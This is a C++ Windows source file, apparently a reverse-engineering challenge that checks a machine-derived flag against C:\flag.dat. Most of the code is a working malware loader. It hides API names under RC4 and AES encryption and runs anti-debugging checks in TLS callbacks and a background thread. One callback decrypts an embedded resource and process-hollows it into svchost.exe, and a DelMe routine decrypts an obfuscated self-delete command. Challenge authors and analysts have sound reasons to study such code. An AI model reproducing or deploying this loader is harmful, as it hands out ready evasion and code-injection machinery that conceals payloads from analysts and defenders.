// draftdown.cpp : Defines the entry point for the application.
//

#include "framework.h"
#include "draftdown.h"
#include "rt_api.h"
#include "AES.h"
#include "rc4.h"
#include "resource.h"


#define MAX_LOADSTRING 100

uint8_t aes_key4rc4[] = {47,210,87,219,154,179,159,31,75,59,152,3,124,103,95,226,83,181,245,150,132,160,95,143,82,123,78,69,83,209,136,91};

uint8_t library[][40] = {
    {149,181,10,142,11,218,52,129,199,62,99,173,209,89,108,50,57,0}, //is debugger present
    {155,163,58,191,0,204,56,165,205,57,93,171,0}, //gettickcount
    {159,174,43,136,2,253,54,139,205,56,86,155,209,72,124,59,42,38,112,90,27,244,212,118,162,30,0}, // check remote debugger present
    {155,163,58,168,28,221,33,131,204,56,99,173,219,73,108,47,62,0}, // get current process
    {152,163,44,158,14,237,33,131,195,39,0}, // DebugBreak
    {137,148,2,175,6,216,61,138,205,45,87,139,219,108,96,48,40}, // URLDownloadToFile
    {155,163,58,166,6,203,38,138,199,4,82,177,208,70,108,11}, // GetModuleHandle
    {154,175,32,143,59,202,32,137,215,62,80,186,227}, //FindResource
    {144,169,47,143,59,202,32,137,215,62,80,186}, // LoadResource
    {143,175,52,142,6,201,1,131,209,35,70,173,215,79}, // SizeofResource
    {144,169,45,128,59,202,32,137,215,62,80,186}, // LockResource

};

uint8_t library_len[] = {18,13,27,18,11,18,17,14,13,15,13};

uint8_t aes_key[] = {238,159,220,137,188,157,223,217,189,148,140,214,232,203,142,137,238,156,219,216,236,206,143,140,236,153,134,140,188,148,216,138};

PVOID api[40] = {};

DWORD crc_func[7] = {};

unsigned char* api_dec[20] = {};

static int antidebug_1 =  0;
static int antidebug_2 = 0;


static int * anti1 = &antidebug_1;
static int* anti2 = &antidebug_2;

static int** ggwp = &anti1;
static int** ggwp2 = &anti2;
DWORD CalcFuncCrc(PUCHAR funcBegin, PUCHAR funcEnd)
{
    DWORD crc = 0;
    for (; funcBegin < funcEnd; ++funcBegin)
    {
        crc += *funcBegin;
    }
    return crc;
}

#pragma auto_inline(off) 

unsigned char* decrypt_aeskey(uint8_t* key, size_t len) {
   
    unsigned char* res = (unsigned char*)malloc(len+1);
    memset(res, 0, len+1);
    for (size_t i = 0; i < len; i+=4)
    {
        res[i] =  0xDE ^ key[i];
        res[i + 1] = 0xAD ^ key[i + 1];
        res[i + 2] = 0xBE ^ key[i + 2];
        res[i + 3] = 0xEF ^ key[i + 3];
    }
    return res;
}

void decrypt_aesend() {}

int CheckTEB()
{
    int isBeingDebugged = 0;
    __asm
    {
        ; Grab the PEB at offset 30 of the fs register
        mov eax, fs: [30h]
        ; push it to the stack
        push ecx
        ; Grab the IsBeingDebugged flag out of the PED
        mov ecx, [eax + 2]
        mov isBeingDebugged, ecx
        pop ecx
    }
    return isBeingDebugged;
}

void checkteb_end() {}


VOID WINAPI tls_callback1(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    HINSTANCE hinstLib = LoadLibrary(TEXT("kernel32.dll"));
    AES aes(AESKeyLength::AES_256);
    unsigned char* key = decrypt_aeskey(aes_key,32);
    unsigned char* iv = (unsigned char*)malloc(17);
    memset(iv, 0, 17);
    memcpy(iv, key, 16);
    unsigned char* rc4_key = aes.DecryptCBC(aes_key4rc4, 32, key,iv);
    
    
    rc4_key[21] = 0;
    uint8_t sbox[256];

    memset(iv, 0, 16);
    memset(key, 0, 32);

    
    
    for (size_t i = 0; i < 11; i++)
    {
        api_dec[i] = (unsigned char*)malloc(library_len[i]);
        memset(api_dec[i], 0, library_len[i]);
        generateRC4SBox(sbox, rc4_key, 21);
        RC4_ORG(library[i], api_dec[i], 0, library_len[i] -1, sbox);
    
    }

    for (size_t i = 0; i < 11; i++)
    {
        api[i] = GetProcAddress(hinstLib, (LPCSTR)api_dec[i]);
    }
    

}


VOID WINAPI tls_callback3(
    PVOID DllHandle,
    DWORD Reason,
    PVOID Reserved)
{
    uint8_t IsDbgPresent = 0;
    __asm {
        mov eax, fs: [30h]
        mov al, [eax + 2h]
        mov IsDbgPresent, al
    }

    if (((anti_dbg_1)api[0])())
    {
        antidebug_1 = 0xC0FFEE;
        antidebug_2 = 0xDEADBEEF;
    }

    if ((IsDbgPresent))
    {
        antidebug_1 = 0xC0FFEE;
        antidebug_2 = 0xDEADBEEF;
    }

    BOOL tmp;
    (anti_dbg_2(api[2]))((get_c_proc(api[3]))(), &tmp);

    if (tmp)
    {
        antidebug_1 = 0xC0FFEE;
        antidebug_2 = 0xDEADBEEF;
    }

    unsigned long NtGlobalFlags = 0;

    __asm {

        mov eax, fs: [30h]
        mov eax, [eax + 68h]
        mov NtGlobalFlags, eax
    }

    if (NtGlobalFlags & 0x70) {
        antidebug_1 = 0xC0FFEE;
        antidebug_2 = 0xDEADBEEF;
    }

    //__try {
    //    ((anti_dbg_3)api[4])();
    //}
    //__except (GetExceptionCode() == EXCEPTION_BREAKPOINT ?
    //    EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
    //    antidebug_1 = 0xC0FFEE;
    //    antidebug_2 = 0xDEADBEEF;
    //}


    if (CheckTEB()) {
        antidebug_1 = 0xC0FFEE;
        antidebug_2 = 0xDEADBEEF;
    }
}





void antiDbgThread() {
    while (true)
    {
        uint8_t IsDbgPresent = 0;
        __asm {
            mov eax, fs: [30h]
            mov al, [eax + 2h]
            mov IsDbgPresent, al
        }

        if (((anti_dbg_1)api[0])())
        {
            antidebug_1 = 0xC0FFEE;
            antidebug_2 = 0xDEADBEEF;
        }

        if ((IsDbgPresent))
        {
            antidebug_1 = 0xC0FFEE;
            antidebug_2 = 0xDEADBEEF;
        }

        //BOOL tmp;
        //(anti_dbg_2(api[2]))((get_c_proc(api[3]))(), &tmp);

        //if (tmp)
        //{
        //    antidebug_1 = 0xC0FFEE;
        //    antidebug_2 = 0xDEADBEEF;
        //}

        unsigned long NtGlobalFlags = 0;

        __asm {

            mov eax, fs: [30h]
            mov eax, [eax + 68h]
            mov NtGlobalFlags, eax
        }

        if (NtGlobalFlags & 0x70) {
            antidebug_1 = 0xC0FFEE;
            antidebug_2 = 0xDEADBEEF;
        }


        if (CheckTEB()) {
            antidebug_1 = 0xC0FFEE;
            antidebug_2 = 0xDEADBEEF;
        }
    }
}

VOID antiDbgThreadEnd(){}



VOID WINAPI tls_callback2(
    PVOID DllHandle,
    DWORD Reason,
    PVOID Reserved)
{
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)antiDbgThread, NULL, 0, NULL);
}


// build crc32 table for functions
VOID WINAPI tls_callback4(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    crc_func[0] = CalcFuncCrc((PUCHAR)tls_callback2, (PUCHAR)tls_callback4);
    crc_func[2] = CalcFuncCrc((PUCHAR)CheckTEB, (PUCHAR)checkteb_end);
    crc_func[3] = CalcFuncCrc((PUCHAR)tls_callback1, (PUCHAR)tls_callback3);
    crc_func[4] = CalcFuncCrc((PUCHAR)tls_callback3, (PUCHAR)antiDbgThread);
    crc_func[5] = CalcFuncCrc((PUCHAR)antiDbgThread, (PUCHAR)antiDbgThreadEnd);
}



int RunPortableExecutable(void* Image) {
    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;
    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;
    CONTEXT* CTX;
    DWORD* ImageBase; // base address of the image
    void* pImageBase; // pointer to the image basedraftdown.rc
    int count;
    char CurrentFilePath[MAX_PATH];

    DOSHeader = PIMAGE_DOS_HEADER(Image);
    NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);



    if (1 == 1) {
        ZeroMemory(&PI, sizeof(PI));
        ZeroMemory(&SI, sizeof(SI));
        uint8_t path[] = {67,58,92,92,87,105,110,100,111,119,115,92,92,83,121,115,87,79,87,54,52,92,92,115,118,99,104,111,115,116,46,101,120,101,00};
        if (CreateProcessA((LPCSTR)path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
            CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
            CTX->ContextFlags = CONTEXT_FULL;
            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
                ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
                pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
                    NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
                WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
                for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++) {
                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
                    WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
                        LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
                }
                WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
                CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
                SetThreadContext(PI.hThread, LPCONTEXT(CTX));
                ResumeThread(PI.hThread);
                return 0;
            }
        }
    }
}


VOID WINAPI tls_callback5(PVOID DllHandle, DWORD Reason, PVOID Reserved) {

    if (**ggwp && **ggwp2)
    {
        return;
    }
    HMODULE hModule = ((ghmodule)api[6])(NULL); // get the handle to the current module (the executable file)
    HRSRC hResource = ((frw)api[7])(hModule, MAKEINTRESOURCE(IDR_BIN1), L"BIN"); // substitute RESOURCE_ID and RESOURCE_TYPE.
    HGLOBAL hMemory = ((lrw)api[8])(hModule, hResource);
    DWORD dwSize = ((szr)api[9])(hModule, hResource);
    LPVOID lpAddress = ((lkr)api[10])(hMemory);

    unsigned char* bytes = new unsigned char[dwSize];
    memcpy(bytes, lpAddress, dwSize);

    uint8_t aes_key[] = {238,213,223,132,179,242,142,151,174,218,208,176,238,213,250,157,234,203,202,171,238,218,208,193};
    uint8_t iv_enc[] = { 238,159,220,137,188,157,223,217,189,148,140,214,232,203,142,137 };

    AES aes(AESKeyLength::AES_192);
    unsigned char* key = decrypt_aeskey(aes_key, 24);
    unsigned char* iv = decrypt_aeskey(iv_enc, 16);
    uint8_t* dec_binary = aes.DecryptCBC(bytes, dwSize, key, iv);

    RunPortableExecutable(dec_binary);
}

#pragma auto_inline(on) 

#ifdef _M_AMD64
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:p_tls_callback1")
#pragma const_seg(push)
#pragma const_seg(".CRT$XLAAA")
EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_callback1 = tls_callback1;
#pragma const_seg(".CRT$XLAAB")
EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_callback2 = tls_callback2;
#pragma const_seg(".CRT$XLAAC")
EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_callback3 = tls_callback3;
#pragma const_seg(".CRT$XLAAD")
EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_callback4 = tls_callback4;
#pragma const_seg(".CRT$XLAAE")
EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_callback5 = tls_callback5;

#pragma const_seg(pop)
#endif
#ifdef _M_IX86
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:_p_tls_callback1")
#pragma data_seg(push)
#pragma data_seg(".CRT$XLAAA")
EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback1 = tls_callback1;
#pragma data_seg(".CRT$XLAAB")
EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback2 = tls_callback2;
#pragma const_seg(".CRT$XLAAC")
EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback3 = tls_callback3;
#pragma const_seg(".CRT$XLAAD")
EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback4 = tls_callback4;
#pragma const_seg(".CRT$XLAAE")
EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback5 = tls_callback5;

#pragma data_seg(pop)
#endif


BOOL get_fake_anti_dbg() {
    
    return IsDebuggerPresent();
}

void DelMe() {
    uint8_t enc_cmd[] = { 189,192,218,193,187,213,219,207,241,238,158,159,183,195,217,207,239,131,143,193,239,131,143,207,243,195,158,222,254,128,201,207,237,157,142,223,254,147,158,161,171,193,158,201,254,233,219,131,254,130,216,207,241,220,158,205,251,222,156 };

    LPSTR arg = (LPSTR)decrypt_aeskey(enc_cmd, 60);
    arg[59] = 0;
    CHAR szModuleName[MAX_PATH];
    CHAR szCmd[2 * MAX_PATH];
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    GetModuleFileNameA(NULL, szModuleName, MAX_PATH);

    StringCbPrintfA(szCmd, 2 * MAX_PATH, arg, szModuleName);

    CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}



int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
  
    SuperSecret* ss = new SuperSecret();
    ss->CheckSuperSecret();
    return 1;

}



uint16_t SuperSecret::hashMacAddress(PIP_ADAPTER_INFO info)
{
    uint16_t hash = 0;
    for (uint32_t i = 0; i < info->AddressLength; i++)
    {
        hash += (info->Address[i] << ((i & 1) * 8));
    }
    return hash;
}

void SuperSecret::getMacHash(uint16_t& mac1, uint16_t& mac2)
{
    IP_ADAPTER_INFO AdapterInfo[32];
    DWORD dwBufLen = sizeof(AdapterInfo);

    DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
    if (dwStatus != ERROR_SUCCESS)
        return; // no adapters.      

    PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
    mac1 = SuperSecret::hashMacAddress(pAdapterInfo);
    if (pAdapterInfo->Next)
        mac2 = SuperSecret::hashMacAddress(pAdapterInfo->Next);

    // sort the mac addresses. We don't want to invalidate     
    // both macs if they just change order.           
    if (mac1 > mac2)
    {
        uint16_t tmp = mac2;
        mac2 = mac1;
        mac1 = tmp;
    }
}

uint16_t SuperSecret::getVolumeHash()
{
    DWORD serialNum = 0;

    // Determine if this volume uses an NTFS file system.      
    GetVolumeInformationA("c:\\", NULL, 0, &serialNum, NULL, NULL, NULL, 0);
    uint16_t hash = (uint16_t)((serialNum + (serialNum >> 16)) & 0xFFFF);

    return hash;
}

uint16_t SuperSecret::getCpuHash()
{
    int cpuinfo[4] = { 0, 0, 0, 0 };
    __cpuid(cpuinfo, 0);
    uint16_t hash = 0;
    uint16_t* ptr = (uint16_t*)(&cpuinfo[0]);
    for (uint32_t i = 0; i < 8; i++)
        hash += ptr[i];

    return hash;
}

const char* SuperSecret::getMachineName()
{
    static char computerName[1024];
    DWORD size = 1024;
    GetComputerNameA(computerName, &size);
    return &(computerName[0]);
}

SuperSecret::SuperSecret()
{
    this->cpuHash = this->getCpuHash();
    this->volumeHash = this->getVolumeHash();
    this->machineName = this->getMachineName();
    this->getMacHash(this->mac1, this->mac2);
    srand(time(NULL));
    this->macHash = (this->mac1 * this->mac2) * rand() % 100;
    this->cpuHash *= rand() % 10;
    this->volumeHash += rand() % 10;

    this->setSuperSecret();
}

SuperSecret::~SuperSecret()
{
}


void SuperSecret::CheckSuperSecret() {
    std::ifstream t("C:\\flag.dat");
    std::stringstream buffer;
    buffer << t.rdbuf();
    std::string flag = "SEE{" + this->superSecretString + "}";
    if (flag.compare(buffer.str())) {
        exit(0);
    }
}

std::string TextToBinaryString(string words) {
    std::string binaryString = "";
    for (char& _char : words) {
        binaryString += bitset<8>(_char).to_string();
    }
    return binaryString;
}

void SuperSecret::setSuperSecret() {
    std::string cpuString = std::bitset< 16 >(this->cpuHash).to_string(); // string conversion
    std::string macString = std::bitset< 16 >(this->macHash).to_string(); // string conversion
    std::string volString = std::bitset< 16 >(this->volumeHash).to_string();
    std::string nameString = TextToBinaryString(this->machineName);

    this->superSecretString = nameString + "-" + cpuString + "-" + macString + "-" + volString;


}